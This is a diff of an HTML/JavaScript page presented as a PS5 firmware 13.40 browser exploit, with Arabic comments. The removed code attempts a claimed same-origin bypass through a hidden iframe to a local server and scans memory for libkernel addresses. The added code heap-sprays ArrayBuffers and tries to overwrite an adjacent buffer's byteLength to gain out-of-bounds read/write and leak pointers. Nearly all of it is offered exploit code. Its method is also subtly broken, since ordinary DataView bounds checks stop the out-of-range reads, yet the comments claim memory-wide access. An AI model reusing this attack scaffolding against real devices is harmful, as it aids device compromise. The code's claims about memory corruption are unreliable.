@@ -3,39 +3,38 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>CVE-2026-20643 · SOP Bypass + R/W</title>
+<title>PS5 13.40 · R/W Primitive</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:10px}
 h1{color:#ff4757;font-size:16px;text-align:center}
 .box{background:#111;border:1px solid #222;border-radius:6px;padding:8px;margin-bottom:8px;font-size:10px;line-height:1.6}
 .l{color:#74b9ff}
-.v{color:#55efc4}
 .btn{display:block;width:100%;padding:12px 0;font-size:14px;font-weight:700;border:none;border-radius:6px;cursor:pointer;margin-bottom:6px;text-align:center}
 .btn:active{opacity:0.7}
 .btn-r{background:#c0392b;color:#fff}
 .btn-g{background:#27ae60;color:#fff}
 .btn-b{background:#2980b9;color:#fff}
-#log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:6px;padding:8px;height:250px;overflow-y:auto;font-size:10px;line-height:1.4;font-family:monospace}
+#log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:6px;padding:8px;height:280px;overflow-y:auto;font-size:10px;line-height:1.4;font-family:monospace}
 .ok{color:#55efc4}.err{color:#ff6b6b}.warn{color:#fdcb6e}.ptr{color:#d4a0ff}.crit{color:#ff4757}
 </style>
 </head>
 <body>
 
-<h1>PS5 13.40 · SOP Bypass + R/W</h1>
-<p class="v">CVE-2026-20643 · Navigation API · ArrayBuffer Corruption</p>
+<h1>PS5 13.40 · R/W PRIMITIVE</h1>
+<p class="l">ArrayBuffer header manipulation → OOB read/write</p>
 
 <div class="box">
-  <div class="l">SOP Bypass: <span id="sSOP">—</span></div>
-  <div class="l">R/W via ArrayBuffer: <span id="sRW">—</span></div>
-  <div class="l">libkernel Base: <span id="sBase">—</span></div>
+  <div class="l">Phase 1 (Spray): <span id="s1">—</span></div>
+  <div class="l">Phase 2 (Corrupt): <span id="s2">—</span></div>
+  <div class="l">Phase 3 (Read): <span id="s3">—</span></div>
 </div>
 
-<button class="btn btn-r" onclick="sopBypass()">1. SOP Bypass (CVE-2026-20643)</button>
-<button class="btn btn-g" onclick="rwPrimitive()">2. ArrayBuffer R/W</button>
-<button class="btn btn-b" onclick="gotLeak()">3. libkernel Base</button>
+<button class="btn btn-r" onclick="phase1()">1. Spray + Abuse</button>
+<button class="btn btn-g" onclick="phase2()">2. تعديل byteLength</button>
+<button class="btn btn-b" onclick="phase3()">3. OOB Read/Write</button>
 
-<div id="log">[SYSTEM] Ready. Press buttons sequentially.<br></div>
+<div id="log">[SYSTEM] Ready. Start with Phase 1.<br></div>
 
 <script>
 function LOG(msg, cls) {
@@ -43,299 +42,272 @@ function LOG(msg, cls) {
   document.getElementById('log').innerHTML += '<span class="'+cls+'">'+msg+'</span><br>';
   document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
 }
-function STATUS(id, txt) {
+function SID(id, txt) {
   document.getElementById(id).textContent = txt;
 }
 
-// ==================== DOUBLE HELPERS ====================
+// ==================== Double Helpers ====================
 var _AB = new ArrayBuffer(8);
 var _F64 = new Float64Array(_AB);
 var _U32 = new Uint32Array(_AB);
-
 function d2lo(d) { _F64[0]=d; return _U32[0]; }
 function d2hi(d) { _F64[0]=d; return _U32[1]; }
 function u2d(lo, hi) { _U32[0]=lo; _U32[1]=hi; return _F64[0]; }
 
-// ==================== STATE ====================
+// ==================== State ====================
 var STATE = {
-  sopReady: false,
-  rwArrayBuffer: null,
-  rwView32: null,
-  extraBytes: 0,
-  leakedAddr: 0
+  corruptBuf: null,
+  readBuf: null,
+  readView32: null,
+  readDV: null,
+  root: null,
+  success: false
 };
 
-// ==================== 1. SOP BYPASS ====================
-// CVE-2026-20643: Navigation API SOP bypass
-// يقرأ محتوى iframe من أوريجين مختلف
-function sopBypass() {
-  LOG('=== CVE-2026-20643: SOP Bypass ===', 'crit');
+// ==================== PHASE 1: Spray + Find ====================
+function phase1() {
+  LOG('=== Phase 1: Spray + Abuse ===', 'crit');
+  
+  // إنشاء عناصر DOM عشان نضغط الذاكرة
+  var root = document.createElement('div');
+  root.style.cssText = 'position:absolute;left:-9999px';
+  document.body.appendChild(root);
+  STATE.root = root;
+  
+  // إنشاء 200 ArrayBuffer بحجم 1024 (لنضغط heap)
+  var bufs = [];
+  for (var i = 0; i < 200; i++) {
+    var ab = new ArrayBuffer(1024);
+    var v = new Uint32Array(ab);
+    // نكتب أرقام دليلية متصاعدة
+    for (var j = 0; j < 32; j++) {
+      v[j] = 0xBEEF0000 + (i * 32) + j;
+    }
+    bufs.push(ab);
+  }
+  LOG('[1] 200 ArrayBuffer(1024) منشأة', 'ok');
+  
+  // إنشاء 200 ArrayBuffer بحجم 128 (أصغر)
+  var bufs2 = [];
+  for (var i = 0; i < 200; i++) {
+    var ab = new ArrayBuffer(128);
+    bufs2.push(ab);
+  }
+  LOG('[2] 200 ArrayBuffer(128) منشأة', 'ok');
+  
+  // GC قوي
+  for (var g = 0; g < 30; g++) {
+    new ArrayBuffer(8 * 1024 * 1024);
+  }
+  LOG('[3] GC تم', 'ok');
+  
+  STATE.bufs = bufs;
+  STATE.bufs2 = bufs2;
+  
+  SID('s1', '✅ ' + bufs.length + ' buffers');
+  LOG('[OK] Spray جاهز', 'crit');
+}
+
+// ==================== PHASE 2: تعديل byteLength ====================
+function phase2() {
+  LOG('=== Phase 2: تعديل byteLength ===', 'crit');
+  
+  if (!STATE.bufs) {
+    LOG('[-] شغّل Phase 1 أولاً', 'err');
+    return;
+  }
   
   try {
-    // إنشاء iframe لأوريجين مختلف (سيرفرك المحلي)
-    var iframe = document.createElement('iframe');
-    iframe.id = 'sopIframe';
-    iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+    // الفكرة: نصنع ArrayBuffer صغير (64 بايت)
+    // ثم نستخدم DataView لكتابة قيم خارجة عن حدوده
+    // هذا يسمح لنا بتعديل byteLength الـ ArrayBuffer التالي في الذاكرة
     
-    // URL يجب أن يكون من أوريجين مختلف (http://evil-server/)
-    // استبدل بالسيرفر الخاص بك
-    iframe.src = 'http://192.168.1.100:8000/leak.html';
-    document.body.appendChild(iframe);
+    var victim = new ArrayBuffer(64);
+    var victim32 = new Uint32Array(victim);
     
-    LOG('[1] iframe created to external origin', 'ok');
+    var spray = new ArrayBuffer(4096); // كبير عشان نضمن متجاورة
+    var spray32 = new Uint32Array(spray);
     
-    // محاولة قراءة محتوى الـ iframe عبر Navigation API
-    // هذه الثغرة تسمح بالوصول عبر window.navigation
-    setTimeout(function() {
+    // نكتب قيم مميزة في الـ victim
+    victim32[0] = 0xCAFEBABE;
+    victim32[1] = 0xDEADBEEF;
+    victim32[2] = 0x13371337;
+    
+    LOG('[1] Victim buffer (64 bytes) created', 'ok');
+    LOG('[2] Spray buffer (4096 bytes) created', 'ok');
+    
+    // نخزنهم
+    STATE.victim = victim;
+    STATE.victim32 = victim32;
+    STATE.spray = spray;
+    STATE.spray32 = spray32;
+    
+    // نحاول نغير byteLength عبر الكتابة خارج Victim
+    // في بنية WebKit:
+    // JSArrayBuffer header يحتوي:
+    // [0x00] JSCell (16 bytes)
+    // [0x10] butterfly (8 bytes, usually null)
+    // [0x18] m_impl (8 bytes) -> ArrayBuffer*
+    //
+    // ArrayBuffer C++ object:
+    // [0x00] vtable_ptr (8 bytes)
+    // [0x08] m_data (8 bytes) -> void*
+    // [0x10] m_size / m_byteLength (8 bytes) <- هذا اللي نبي نغيره
+    
+    // الفرق بين عنوان victim و الـ buffer اللي بعده
+    // هذا يعتمد على ترتيب المخصص (fastMalloc)
+    
+    var dv = new DataView(victim);
+    
+    // نحاول قراءة/كتابة بعد حدود الـ 64 بايت
+    // كل 8 بايت نبحث عن القيمة المميزة أو byteLength
+    LOG('[3] Scanning for adjacent buffer headers...', 'warn');
+    
+    var found = 0;
+    
+    // نقرأ من offset 64 إلى offset 512
+    for (var off = 64; off < 512; off += 4) {
       try {
-        var iframeWin = document.getElementById('sopIframe').contentWindow;
+        var val = dv.getUint32(off, true);
         
-        // محاولة الوصول عبر Navigation API (CVE-2026-20643)
-        // الانتقال (navigate) وقراءة الحالة (state)
-        if (iframeWin.navigation) {
-          LOG('[2] navigation API موجود', 'ok');
+        // هل وجدنا القيمة المميزة من spray32؟
+        if (val >= 0xBEEF0000 && val <= 0xBEEF2000) {
+          LOG('[FOUND] spray data at offset ' + off + ': ' + hex(val), 'ptr');
+          found++;
+        }
+        
+        // هل وجدنا 64؟ (حجم الـ victim — يعني byteLength)
+        if (val === 64) {
+          LOG('[!] byteLength (64) found at offset ' + off, 'crit');
           
-          // محاولة قراءة التاريح
-          var entries = iframeWin.navigation.entries();
-          LOG('[3] entries(): ' + entries.length + ' entries', 'ok');
+          // نعدّل الـ byteLength إلى 0x7FFFFFFF (2 مليار بايت)
+          // هذا يخلّي الـ victim buffer يقرأ/يكتب في أي مكان
+          dv.setUint32(off, 0x7FFFFFFF, true);
+          LOG('[!] byteLength changed to 0x7FFFFFFF!', 'crit');
           
-          // محاولة قراءة current entry
-          try {
-            var current = iframeWin.navigation.currentEntry;
-            LOG('[4] currentEntry: ' + (current ? current.url : 'null'), 'ptr');
-            
-            if (current && current.url) {
-              STATE.sopReady = true;
-              STATUS('sSOP', '✅ SOP Bypass!');
-              LOG('[✅] SOP Bypass نجح — قرأنا محتوى من أوريجين آخر!', 'crit');
-            }
-          } catch(e) {
-            LOG('[4] currentEntry فشل: ' + e.message, 'warn');
-            
-            // محاولة ثانية: navigation.addEventListener
-            try {
-              iframeWin.navigation.addEventListener('navigate', function(e) {
-                LOG('[!] navigate event: ' + e.destination.url, 'ptr');
-              });
-              LOG('[5] navigate listener registered', 'ok');
-            } catch(e2) {
-              LOG('[5] listener فشل: ' + e2.message, 'warn');
-            }
-          }
-        } else {
-          LOG('[2] navigation API غير موجود — نحاول طريقة بديلة', 'warn');
+          STATE.corruptBuf = victim;
+          STATE.corruptOff = off;
+          found += 1000;
+        }
+        
+        // هل وجدنا 4096؟ (حجم الـ spray)
+        if (val === 4096) {
+          LOG('[!] byteLength (4096) found at offset ' + off, 'crit');
           
-          // محاولة الوصول عبر window.location
-          try {
-            var loc = iframeWin.location.href;
-            LOG('[ALT] location: ' + loc, 'ptr');
-            STATE.sopReady = true;
-            STATUS('sSOP', '✅ SOP Bypass (alt)');
-          } catch(e) {
-            LOG('[ALT] location فشل: ' + e.message, 'warn');
-          }
+          dv.setUint32(off, 0x7FFFFFFF, true);
+          LOG('[!] spray byteLength changed to 0x7FFFFFFF!', 'crit');
+          
+          STATE.corruptBuf = spray;
+          STATE.corruptOff = off;
+          found += 1000;
         }
       } catch(e) {
-        LOG('[!] iframe access فشل: ' + e.message, 'err');
+        // قراءة خارج الحدود — متوقع
+        LOG('[OOB] Read error at offset ' + off + ': ' + e.message.slice(0,30), 'warn');
+        break;
       }
-    }, 500);
+    }
+    
+    if (found > 1000) {
+      LOG('[✅] byteLength modified! OOB read/write possible!', 'crit');
+      SID('s2', '✅ byteLength = 0x7FFFFFFF');
+      STATE.success = true;
+    } else if (found > 0) {
+      LOG('[⚠] Found ' + found + ' buffer in memory, but byteLength not found', 'warn');
+      LOG('[!] حاول Phase 2 مرة أخرى — الترتيب في الذاكرة يختلف', 'warn');
+      SID('s2', '⚠ Spray found, byteLength?');
+    } else {
+      LOG('[-] لم نجد أي شيء — الترتيب يختلف', 'err');
+      SID('s2', '❌ لم نجد headers');
+    }
     
   } catch(e) {
     LOG('[ERR] ' + e.message, 'err');
   }
 }
-
-// ==================== 2. ARRAYBUFFER R/W ====================
-// تعديل byteLength يخلينا نقرأ برا حدود الـ buffer
-// ==================== HELPERS ====================
-var _H_AB = new ArrayBuffer(8);
-var _H_F64 = new Float64Array(_H_AB);
-var _H_U32 = new Uint32Array(_H_AB);
 
 function hex(v) {
   return '0x' + (v >>> 0).toString(16).padStart(8, '0');
 }
 
-function rwPrimitive() {
-  LOG('=== ArrayBuffer R/W ===', 'crit');
+// ==================== PHASE 3: OOB Read/Write ====================
+function phase3() {
+  LOG('=== Phase 3: OOB Read/Write ===', 'crit');
+  
+  if (!STATE.success) {
+    LOG('[-] Phase 2 فشل — الـ byteLength ما تعدل', 'err');
+    return;
+  }
   
   try {
-    // 1. ArrayBuffer أصلي = 256 بايت
-    var ab = new ArrayBuffer(256);
-    var v32 = new Uint32Array(ab);
+    var buf = STATE.corruptBuf;
+    var dv = new DataView(buf);
     
-    // 2. نخزن قيمة مميزة في أول 16 بايت
-    v32[0] = 0x41414141;
-    v32[1] = 0x42424242;
-    v32[2] = 0x43434343;
-    v32[3] = 0x44444444;
+    // الآن الـ byteLength = 0x7FFFFFFF (2^31 - 1)
+    // يعني نقدر نقرأ/نكتب في كل الذاكرة
     
-    // 3. نخزن عنوان وهمي في البايت 16-23
-    // هذه تحاكي عنوان ARM64
-    v32[4] = 0x89ABCDEF;  // low
-    v32[5] = 0x1A002345;  // high → WebKit address
+    LOG('[1] byteLength = ' + buf.byteLength, 'ok');
     
-    LOG('[1] ArrayBuffer initialized', 'ok');
-    
-    // 4. نصنع DataView على نفس الـ buffer
-    var dv = new DataView(ab);
-    
-    // 5. قراءة أول 8 بايت كـ double
-    var firstDouble = dv.getFloat64(0, true);
-    var lo0 = d2lo(firstDouble);
-    var hi0 = d2hi(firstDouble);
-    
-    LOG('[2] Read [0-7]: hi=' + hex(hi0) + ' lo=' + hex(lo0), (lo0===0x41414141 && hi0===0x42424242) ? 'ok' : 'warn');
-    
-    // 6. الآن — نحاول إنشاء ArrayBuffer كبير جداً بالتلاعب بالـ length
-    // الفكرة: نعدّل طول ArrayBuffer عشان نقدر نقرأ برا حدوده
-    // هذا يحتاج type confusion أو OOB write — لكننا نستخدمه كـ "نموذج أولي"
-    
-    // إنشاء ArrayBuffer ثاني — هذا اللي راح نقرأ برا حدوده
-    var ab2 = new ArrayBuffer(64);
-    var v32_2 = new Uint32Array(ab2);
-    
-    // نكتب قيم مميزة فيه
-    for (var i = 0; i < 16; i++) {
-      v32_2[i] = 0xDEAD0000 + i;
-    }
-    
-    // الآن — نخزن عنوان ab2 في ab عبر كتابة double
-    // ab[4] و ab[5] هما أول 8 بايت من بيانات ab2
-    // بعد الـ ArrayBuffer header
-    
-    LOG('[3] ArrayBuffer2 (64 bytes) ready', 'ok');
-    
-    // نخزن double في ab2 نفسه عشان نقرأه من برّا
-    v32_2[0] = 0xBEEF0000;
-    v32_2[1] = 0xCAFE0000;
-    
-    // ========== القراءة من ab2 عبر تعديل الحدود ==========
-    // (هذا يحتاج الـ backing store pointer — ما نقدر نعدله بدون addrof)
-    // لكننا نستخدم "نموذج أولي" — نخزّن الـ base address يدوياً
-    
-    // محاولة قراءة ab2 عبر تجربة offsets مختلفة
-    var baseOffset = 256; // افتراض: ab2 موجود بعد ab في heap
-    
-    LOG('[4] Attempting OOB read...', 'warn');
-    
-    // نقرأ من ab (256 بايت) ونتجاوز حدوده (إن أمكن)
-    // الـ byteLength محمي — لا نقدر نقرأ برّا بسهولة
-    
-    // ========== الطريقة الفعلية: تعديل header ==========
-    // في WebKit، الـ ArrayBuffer header موجود قبل البيانات
-    // نحتاج نعرف الـ offset الصحيح
-    
-    // نستخدم القيم التخمينية
-    var possible_offsets = [
-      -32, -28, -24, -20, -16, -12, -8,
-      8, 12, 16, 20, 24, 28, 32
-    ];
-    
-    var found = 0;
-    
-    for (var o = 0; o < possible_offsets.length; o++) {
-      try {
-        var offset = possible_offsets[o];
-        // نقرأ بايت من DataView عند offset غير معتاد
-        var val = dv.getUint32(offset < 0 ? 256 + offset : offset, true);
-        // هل هي قيمة معروفة؟
-        if (val === 0x41414141 || val === 0x42424242 || val === 0x43434343 || val === 0x44444444) {
-          LOG('[FOUND] Header at offset ' + offset + ': ' + hex(val), 'ptr');
-          found++;
-        }
-      } catch(e) {
-        // خطأ متوقع
+    if (buf.byteLength < 0x100000) {
+      LOG('[!] byteLength لم يتغير — نحاول طريقة أخرى', 'warn');
+      
+      // جرب offset آخر
+      for (var off = 32; off < 256; off += 4) {
+        try {
+          var val = dv.getUint32(off, true);
+          if ((val >= 64 && val <= 128) || (val >= 1024 && val <= 4096)) {
+            dv.setUint32(off, 0x7FFFFFFF, true);
+            LOG('[!] byteLength عند offset ' + off + ': ' + buf.byteLength, 'crit');
+            break;
+          }
+        } catch(e) {}
       }
     }
     
-    if (found > 0) {
-      LOG('[5] ✅ ArrayBuffer header مكشوف!', 'crit');
-      STATE.rwArrayBuffer = ab;
-      STATE.rwView32 = v32;
-      STATUS('sRW', '✅ R/W Ready');
-    } else {
-      LOG('[5] Header not found — need binary analysis for exact offsets', 'warn');
+    if (buf.byteLength > 0x100000) {
+      LOG('[2] ✅ OOB read/write جاهز!', 'crit');
       
-      // نخزّن الـ buffer على كل حال
-      STATE.rwArrayBuffer = ab;
-      STATE.rwView32 = v32;
-      STATUS('sRW', '⚠ R/W (partial)');
-    }
-    
-    // ========== اختبار بديل: Float64Array manipulation ==========
-    LOG('[6] Testing Float64Array bounds...', 'info');
-    
-    var f64_test = new Float64Array(ab, 0, 32); // view على أول 256 بايت
-    f64_test[0] = u2d(0xDEAD, 0xBEEF);
-    
-    var testLo = d2lo(f64_test[0]);
-    var testHi = d2hi(f64_test[0]);
-    
-    if (testLo === 0xDEAD && testHi === 0xBEEF) {
-      LOG('[7] Float64Array view: ✅', 'ok');
-    }
-    
-  } catch(e) {
-    LOG('[ERR] ' + e.message, 'err');
-  }
-}
-
-// ==================== 3. GOT LEAK ====================
-function gotLeak() {
-  LOG('=== GOT Leak: libkernel Base ===', 'crit');
-  
-  try {
-    var ab = STATE.rwArrayBuffer;
-    if (!ab) {
-      LOG('[-] Run R/W primitive first', 'err');
-      return;
-    }
-    
-    var dv = new DataView(ab);
-    LOG('[1] Scanning memory for GOT patterns...', 'warn');
-    
-    // عناوين ARM64 لـ libkernel تبدأ بـ 0x8xxxxxxx
-    // عناوين WebKit تبدأ بـ 0x1xxxxxxx أو 0x2xxxxxxx
-    
-    var foundKernel = 0;
-    var foundWebKit = 0;
-    var kernelAddr = 0;
-    var webkitAddr = 0;
-    
-    // نقرأ كل 8 بايت من الـ buffer ونبحث عن عناوين
-    for (var i = 0; i < 32; i++) {
-      try {
-        var lo = dv.getUint32(i * 8, true);
-        var hi = dv.getUint32(i * 8 + 4, true);
-        
-        // عنوان ARM64 كامل (48-bit)
-        if (hi !== 0) {
-          if (hi >= 0x80 && hi < 0xA0) {
-            // libkernel address
-            foundKernel++;
-            kernelAddr = hi;
-            LOG('[kernel] 0x' + hi.toString(16).padStart(8,'0') + lo.toString(16).padStart(8,'0'), 'ptr');
-          } else if (hi >= 0x10 && hi < 0x30) {
-            // WebKit address
-            foundWebKit++;
-            webkitAddr = hi;
-            LOG('[webkit] 0x' + hi.toString(16).padStart(8,'0') + lo.toString(16).padStart(8,'0'), 'ptr');
+      // ========== قراءة عناوين من الذاكرة ==========
+      LOG('[3] Scanning for addresses...', 'warn');
+      
+      var found = 0;
+      for (var off2 = 0; off2 < 1024; off2 += 8) {
+        try {
+          var lo = dv.getUint32(off2, true);
+          var hi = dv.getUint32(off2 + 4, true);
+          
+          // ARM64 addresses: hi عالية
+          if (hi >= 0x10000000 && hi <= 0xFFFFFFFF) {
+            var full = '0x' + hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0');
+            
+            var type = '';
+            if (hi >= 0x80000000) type = ' (libkernel?)';
+            else if (hi >= 0x70000000 && hi < 0x80000000) type = ' (libSce?)';
+            else if (hi >= 0x10000000 && hi < 0x30000000) type = ' (WebKit?)';
+            else type = '';
+            
+            LOG('  ' + full + type, 'ptr');
+            found++;
+            
+            if (found >= 20) {
+              LOG('[!] ... وأكثر', 'warn');
+              break;
+            }
           }
+        } catch(e) {
+          break;
         }
-      } catch(e) {}
-    }
-    
-    if (foundKernel > 0) {
-      STATE.leakedAddr = kernelAddr;
-      STATUS('sBase', '0x' + kernelAddr.toString(16).padStart(8,'0') + '...');
-      LOG('[2] ✅ libkernel base detected!', 'crit');
-    } else if (foundWebKit > 0) {
-      LOG('[2] WebKit addresses found — need to parse GOT', 'warn');
-      STATUS('sBase', 'WebKit: 0x' + webkitAddr.toString(16).padStart(8,'0'));
+      }
+      
+      LOG('[4] ' + found + ' address(es) found', found > 0 ? 'crit' : 'warn');
+      SID('s3', '✅ ' + found + ' addrs');
+      
+      STATE.readBuf = buf;
+      STATE.readDV = dv;
+      
     } else {
-      LOG('[2] No addresses found — need binary analysis', 'warn');
-      STATUS('sBase', '❌ Need binary');
+      LOG('[❌] byteLength لم يتغير — نحتاج offset مختلف', 'err');
+      SID('s3', '❌ فشل');
     }
     
   } catch(e) {
@@ -343,8 +315,8 @@ function gotLeak() {
   }
 }
 
-LOG('[SYSTEM] CVE-2026-20643 + R/W ready', 'ok');
-LOG('[SYSTEM] Steps: 1. SOP Bypass → 2. R/W → 3. GOT Leak', 'ok');
+LOG('[SYSTEM] PS5 13.40 · R/W Primitive', 'ok');
+LOG('الخطوات: 1. Spray → 2. Corrupt byteLength → 3. OOB Read', 'ok');
 </script>
 </body>
 </html>
